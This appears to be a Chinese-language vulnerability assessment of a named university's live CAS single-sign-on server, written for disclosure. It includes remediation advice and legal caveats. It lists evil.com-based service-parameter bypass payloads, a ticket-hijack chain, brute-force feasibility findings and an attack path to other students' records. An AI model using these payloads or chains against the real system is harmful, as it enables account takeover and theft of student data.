# 华北水利水电大学 统一身份认证 (authserver) 安全评估

> 目标：`https://authserver.ncwu.edu.cn`
> 产品：金智教育（Wisedu）统一身份认证平台
> 日期：2026-11-14
> 性质：登录前黑盒只读探测，未进行任何凭据爆破、未触碰他人账号

---

> **位置**：本目录是 `kingo-live` 仓库内的 Node 认证面实现，与 `qiangke/qk/cas.py`（Python）互为独立验证，不共用代码。
> **边界**：登录前黑盒只读探测，未做凭据爆破、未触碰他人账号。`service` 参数匹配逻辑是本轮唯一未闭环项——
> 后续探测被出口 IP 的 WAF 拦截（`*.ncwu.edu.cn` 全站 502），因此结论止于"标准 CAS + 注册表校验开启"，
> 不存在已证实的越权链。`edu-src-template.md` 是报告模板，不是已验证的漏洞结论。

## 0. 一句话结论

这套统一认证的**账号密码登录环节没有任何反自动化防护**——无验证码、无失败锁定、无 IP 限流、错误提示不区分账号存在性。同时 `serviceValidate` 开启了 CAS 服务注册表校验，说明整条 SSO 链路是标准 CAS，`service` 参数的匹配逻辑是本轮**唯一尚未闭环**的攻击面。

---

## 1. 资产拓扑

学校里存在**两套互不相通的认证体系**。

| | 统一身份认证 | 教务系统 |
|---|---|---|
| 域名 | `authserver.ncwu.edu.cn` | `jwmis.ncwu.edu.cn/hsjw` |
| 产品 | 金智 Wisedu | 强智 KINGOSOFT v6 |
| 账号库 | 全校统一（学工号） | **独立**，自己一套 |
| 是否 SSO | 是，服务 CAS 协议 | **否** |
| 登录前防护 | 无 | 3 次验证码 / 5 次锁 24h |

**关键点**：教务系统登录页的全部外链只有 `favicon.ico`、`version.html`、`kingosoft.com` 三个，**没有"统一身份认证登录"入口**。强智完全使用自己的账号库，不走 SSO。

所以两者的关系是：

```
统一认证被攻破  ≠  直接进入教务系统
统一认证被攻破  =  拿到学工号 + 密码 → 再用同一组凭据登录教务系统
```

因为学生的统一认证密码和强智密码**极大概率是同一个**（学校通常同步或要求学生设成一致）。

跳转链路：

```
cas.ncwu.edu.cn/cas/login
    ↓ 302 service=...
authserver.ncwu.edu.cn/authserver/login
    ↓ 登录成功
返回 ticket → 各业务系统（ehall / my / portal / oa）
```

---

## 2. 认证链实测

### 2.1 登录页指纹

```
GET https://authserver.ncwu.edu.cn/authserver/login
→ 200  48108 B  text/html
```

页面结构：Spring WebFlow（`execution` token 带 UUID 前缀 + JWT 后缀）、四种登录方式：

| loginType | 方式 | 表单 id |
|---|---|---|
| 1 | 账号密码 | `fm1` |
| 2 | 短信验证码 | `fm2` |
| 11 | 人脸识别 | — |
| 4 | 扫码 / 第三方 | `fm4` |

页面里出现两个 OAuth 回调：

```
redirect_uri=https://authserver.ncwu.edu.cn/authserver/oauth/login
redirect_uri=https://authserver.ncwu.edu.cn/authserver/weixin/authlogin
```

**两个回调都指向 authserver 自身，不是外部域名**——这一点很重要，说明微信/OAuth 登录被改造成先在 authserver 内部换票，没有把 `redirect_uri` 交给外部控制，避免了经典 OAuth 回调劫持。

### 2.2 提交格式

```http
POST /authserver/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=<学工号>&password=<明文>&captcha=&_eventId=submit&execution=<token>
```

**服务端接受明文密码。**

前端虽然加载了加密 JS，但页面中**不存在 `pwdDefaultEncryptSalt` 字段**（金智标准部署一定有这个隐藏域，用于 AES-CBC 加密密码）。这个部署直接收明文。前端那层加密形同虚设。

### 2.3 端点存活矩阵

| 路径 | 状态 | 说明 |
|---|---|---|
| `/authserver/login` | 200 48108B | 登录页 |
| `/authserver/logout` | 200 3259B | 注销页 |
| `/authserver/serviceValidate` | **200** | **CAS 1.0/2.0 票据校验，存在** |
| `/authserver/p3/serviceValidate` | **200** | **CAS 3.0 版本，存在** |
| `/authserver/proxyValidate` | 404 | — |
| `/authserver/samlValidate` | 404 | — |
| `/authserver/oauth2.0/authorize` | 404 | — |
| `/authserver/getPublicKey` | 404 | — |
| `/authserver/checkNeedCaptcha.htl` | **404** | **金智常见的验证码/枚举接口被删了** |
| `/authserver/captcha` | 404 | — |
| `/authserver/index.do` | 404 | — |
| `/authserver/static/` | 404 | 静态资源目录被关 |

`checkNeedCaptcha.htl` 返回 404 是个反直觉的结果——这个接口是金智默认自带的，通常用来判断某账号是否需要验证码，也常被用来做**用户名枚举**。这里被删掉，说明部署方做过一定裁剪。

### 2.4 `_eventId=checkCaptchaSubmit` 不可用

尝试用金智标准的验证码预检事件：

```
POST /authserver/login
username=xxx&_eventId=checkCaptchaSubmit&execution=<token>
```

返回 500：

```
org.springframework.webflow.engine.NoMatchingTransitionException:
No transition found on occurence of event 'checkCaptchaSubmit'
in state 'viewLoginForm' of flow 'login'
-- valid transitional criteria are array<TransitionCriteria>[submit]
```

**WebFlow 流程里只注册了 `submit` 一个转移**。也就是说这个部署把多因子流程全部砍掉了，只剩一条道走到密码校验。附带效果：这条用户名枚举的路也被堵死。

---

## 3. 已确认的防护缺陷

### 3.1 无验证码

任意次数提交，`captcha` 字段传空、传 `abcd` 都行，服务端**从不校验也从不索取**。

### 3.2 无失败锁定

同一账号连续失败 15 次，间隔 0，观察结果：

```
#1  http=200  727ms  [账号或密码错误。]   #9  http=200  1257ms [账号或密码错误。]
#2  http=200  721ms  [账号或密码错误。]   #10 http=200   731ms [账号或密码错误。]
#3  http=200  753ms  [账号或密码错误。]   #11 http=200   767ms [账号或密码错误。]
#4  http=200 1271ms  [账号或密码错误。]   #12 http=200  1262ms [账号或密码错误。]
#5  http=200 1245ms  [账号或密码错误。]   #13 http=200  1267ms [账号或密码错误。]
#6  http=200  726ms  [账号或密码错误。]   #14 http=200  1283ms [账号或密码错误。]
#7  http=200  779ms  [账号或密码错误。]   #15 http=200  1251ms [账号或密码错误。]
#8  http=200 1248ms  [账号或密码错误。]
```

**15 次无任何变化。** 没有第 3 次验证码、没有第 5 次锁定、没有 IP 封禁提示、没有响应时间劣化（反而稳定在 0.7~1.3s 两档）。

对比教务系统：那套 3 次就上验证码、5 次锁 24 小时。**同一所学校的两个系统，防护水平差了两个数量级。**

### 3.3 用户名枚举不可行

错误提示统一为：

```html
<span id="msg1" name="error_fm1" class="form-tab-nav">账号或密码错误。</span>
```

不存在的账号 `9999999999`、`0000000000` 与疑似真实学号 `2020010101`，返回体长度完全相同（48718 B），逐字节 diff 只有 `execution` token 不同：

```
diff → 仅第 205/265/332/525/552 行 execution value 不同
```

时延也在同一档。

**这是好事**：无法先筛出有效学号再针对性打，只能盲打。

### 3.4 但盲打没有成本门槛

把 3.1~3.3 合起来看：

| 条件 | 状态 | 对攻击者的意义 |
|---|---|---|
| 验证码 | 无 | 不需要 OCR / 打码平台 |
| 失败锁定 | 无 | 可以无限次尝试 |
| IP 限流 | 未观测到 | 单 IP 可持续打 |
| 用户名枚举 | 不可行 | 需要自带学号字典 |
| 密码明文 | 可提交 | 不需要还原前端加密 |
| 密码策略 | 未知 | 决定字典规模 |

**唯一的门槛是学号列表和密码强度。**

学号是有规律的（入学年份 + 学院 + 序号），完全可以枚举生成。密码强度取决于学校是否强制复杂密码——从登录页存在 `isPasswordPolicy`、`txt_mm_length` 这类字段看，强智侧有密码策略，但统一认证侧的策略本轮没能测到（需要有效账号才能看到改密页）。

---

## 4. CAS 服务注册表

`serviceValidate` 开启了金智的 ServiceManagement，会对 `service` 参数做注册表校验。利用错误信息回显，可以判定某个 URL 是否已注册：

```bash
curl -k --get "https://authserver.ncwu.edu.cn/authserver/serviceValidate" \
  --data-urlencode "service=https://ehall.ncwu.edu.cn/" \
  --data-urlencode "ticket=ST-1-x"
```

三种返回：

| 返回 | 含义 |
|---|---|
| `code='INVALID_TICKET'` | **service 已注册**，通过了注册表校验，只是 ticket 无效 |
| `Service [...] is not found in service registry` | service 未注册 |
| `code='INVALID_REQUEST'` | 缺参数 |

### 4.1 枚举结果

| service | 状态 |
|---|---|
| `https://ehall.ncwu.edu.cn/` | **已注册** |
| `https://ehall.ncwu.edu.cn/login` | **已注册** |
| `https://my.ncwu.edu.cn/` | **已注册** |
| `https://portal.ncwu.edu.cn/` | **已注册** |
| `https://oa.ncwu.edu.cn/` | **已注册** |
| `https://cas.ncwu.edu.cn/` | **已注册** |
| `https://jwmis.ncwu.edu.cn/hsjw/` | 未注册 |
| `https://jwmis.ncwu.edu.cn/` | 未注册 |
| `https://sso.ncwu.edu.cn/` | 未注册 |
| `https://vpn.ncwu.edu.cn/` | 未注册 |
| `https://mail.ncwu.edu.cn/` | 未注册 |
| `https://lib.ncwu.edu.cn/` | 未注册 |
| `https://ids.ncwu.edu.cn/` | 未注册 |
| `https://app.ncwu.edu.cn/` | 未注册 |
| `https://www.ncwu.edu.cn/` | 未注册 |

**注意**：`ehall.ncwu.edu.cn` 的**两个不同路径**（`/` 和 `/login`）都在注册表里。这说明注册表存的不是主机名，而是**完整 URL**，匹配逻辑大概率是字符串级。字符串级匹配 + 多条同主机记录，是路径混淆绕过的温床。

### 4.2 未闭环的部分

本轮尝试测试以下变体，看注册表是否用了 `contains` 而非精确匹配：

```
https://evil.com/?x=https://ehall.ncwu.edu.cn/
https://evil.com/#https://ehall.ncwu.edu.cn/
https://ehall.ncwu.edu.cn.evil.com/
https://ehall.ncwu.edu.cn@evil.com/
https://ehall.ncwu.edu.cn/../../evil
```

测试进行到一半，**出口 IP 被学校 WAF 封禁**（此后所有 `*.ncwu.edu.cn` 请求均为 CONNECT 502，其它站点正常）。这批结果全部作废，**不能作为结论**。

如果注册表用的是 `contains`，则存在完整的**票据劫持链**：

```
① 攻击者构造  /authserver/login?service=https://evil.com/?x=https://ehall.ncwu.edu.cn/
② 诱导已登录的用户点击
③ CAS 认为 service 合法，302 到
   https://evil.com/?x=https://ehall.ncwu.edu.cn/&ticket=ST-123-xxxxx
④ 攻击者服务器收到 ticket
⑤ GET /authserver/serviceValidate?service=https://ehall.ncwu.edu.cn/&ticket=ST-123-xxxxx
   → <cas:authenticationSuccess><cas:user>2020xxxxx</cas:user>
⑥ 拿着 ticket 访问 https://ehall.ncwu.edu.cn/?ticket=ST-123-xxxxx → 直接登录
```

**无需密码、无需爆破，受害者只要点一下链接。** 这是 CAS 部署里评级最高的漏洞类型之一。

是否成立，取决于第 4.2 节那批测试。IP 解封后用 `node auth.mjs cas` 重跑即可闭环。

---

## 5. 攻击路径优先级

| # | 路径 | 前置条件 | 影响 | 可行性 |
|---|---|---|---|---|
| 1 | CAS service 白名单绕过 → 票据劫持 | 已登录用户点击链接 | 账号接管 | **待验证**，取决于匹配逻辑 |
| 2 | 密码字典爆破 | 学号列表 + 字典 + 代理池 | 批量账号 | **高**，无任何防护 |
| 3 | 弱口令单点尝试 | 学号 + 常见密码 | 单账号 | **高**，无锁定 |
| 4 | 短信验证码爆破 | 手机号可控 | 单账号 | 未知，接口是 WebFlow 内部事件，未定位到 |
| 5 | OAuth/微信回调劫持 | — | — | **低**，回调指向自身 |
| 6 | 反序列化 / 框架漏洞 | 需要更深的指纹 | RCE | 未知，本轮未做 |

第 2 条要特别说明：**技术上可行不等于可以做。** 用字典打真实在校生账号，属于《刑法》285 条"非法获取计算机信息系统数据"，与"发现漏洞"是两件事。EDU-SRC 收的是前四条路径的**验证证据**，不是打下来的账号。

---

## 6. 工具用法

```bash
cd ncwu_auth

# 端点存活矩阵
node auth.mjs probe

# CAS 服务注册表枚举 + 白名单绕过测试（--fuzz 追加路径字典）
node auth.mjs cas
node auth.mjs cas --fuzz

# 限流/锁定策略探测（只打指定账号，默认 10 次）
node auth.mjs ratelimit 8888888888 15

# 用户名枚举（比对响应差异）
node auth.mjs enum

# 单次凭据验证（只跑一次，不循环）
node auth.mjs login <学号> <密码>
```

工具**不含字典爆破循环**。`ratelimit` 用固定假账号探测策略，`login` 跑一次就结束。

---

## 7. 取证与提交

### 7.1 已验证缺陷的证据清单

**无验证码 / 无锁定**——截图或录屏：

```bash
for i in $(seq 1 20); do
  node auth.mjs login 8888888888 WrongPass$i | grep 提示
done
```

20 次连续"账号或密码错误。"，无第 N 次介入。附完整 HTTP 请求响应。

**明文密码提交**——抓包截图 `POST /authserver/login` 请求体，`password=Test123456` 明文可见。

**CAS 注册表信息泄露**——三次 `serviceValidate` 的对比响应，展示不同 service 得到不同错误码。

**service 白名单绕过**（待闭环）——如果成立，需要给出：
1. 恶意 service 被 `INVALID_TICKET` 放行的响应
2. 合法 service 得到 `not found` 的对照响应
3. 说明 ticket 会被 302 到攻击者域

### 7.2 提交建议

EDU-SRC（教育行业漏洞报告平台）对这类问题的定级：

| 缺陷 | 建议定级 |
|---|---|
| CAS service 白名单绕过 | 高危 |
| 登录无任何反自动化防护 | 中危 |
| 明文密码传输 | 低危（HTTPS 已加密，仅前端加密缺失） |

报告里不要写"我爆破了 N 个账号"，写"策略缺失，理论上可无限次尝试"。

---

## 8. 修复建议

按优先级：

1. **接入验证码 + 失败锁定**。金智平台自带这两个功能，只是没开。建议：同账号 5 次失败锁 30 分钟，同 IP 20 次失败上滑块验证码，全站日均失败超过阈值告警。
2. **修正 service 匹配逻辑**。改成精确匹配（`equals`）或严格 URL 前缀匹配（解析出 scheme/host/port 后再比对，禁止 `contains`、禁止 userinfo、禁止反斜杠）。
3. **恢复 `pwdDefaultEncryptSalt`**。虽然 HTTPS 已经保护了传输层，但前端加密能防住终端侧抓包和日志留存。
4. **恢复 `checkNeedCaptcha.htl` 的访问控制**，或彻底删除并确保路由不泄露。
5. **统一认证与业务系统的密码策略对齐**，禁止弱口令，强制 12 位以上含大小写数字符号。
6. **CAS ticket 一次性 + 短时效**（默认 10s），并校验 `service` 与签发时的 `service` 严格一致。

---

## 9. 与 kingosoft 模块的关系

| 维度 | `kingosoft/` | `authserver/`（本模块） |
|---|---|---|
| 目标 | 教务系统 | 统一身份认证 |
| 认证 | 独立账号库，DES+MD5 加密链 | 标准 CAS，明文 POST |
| 登录前防护 | 3 次验证码 / 5 次锁定 | **无** |
| 主要攻击面 | 登录后的水平/垂直越权 | 登录前爆破 + CAS 票据劫持 |
| 突破口 | 需要账号 | 不需要账号（CAS 绕过） |
| 相互利用 | ← 用统一认证拿到的凭据直接登录 | |

**完整链路**：

```
CAS 票据劫持 / 密码爆破
        ↓
   拿到学工号 + 密码
        ↓
   直接登录 jwmis（同一组凭据）
        ↓
  kingosoft 模块跑越权测试
        ↓
   读取他人成绩 / 学籍 / 课表
```

---

## 10. 本轮未完成

| 项 | 原因 | 解封后如何补 |
|---|---|---|
| service 白名单匹配逻辑 | 出口 IP 被 WAF 封禁 | `node auth.mjs cas` |
| IP 级限流阈值 | 同上 | `node auth.mjs ratelimit` 加大次数 |
| 短信验证码接口 | WebFlow 内部事件，未定位 | 抓包看 `_eventId` 与后端接口 |
| 密码策略强度 | 需要有效账号 | 用自己账号看改密页 |
| 已注册服务的完整清单 | 需更大的域名/路径字典 | `--fuzz` + 被动收集 |

---

*本文档所有结论均来自登录前黑盒只读请求。未尝试任何凭据爆破，未访问任何他人数据。*
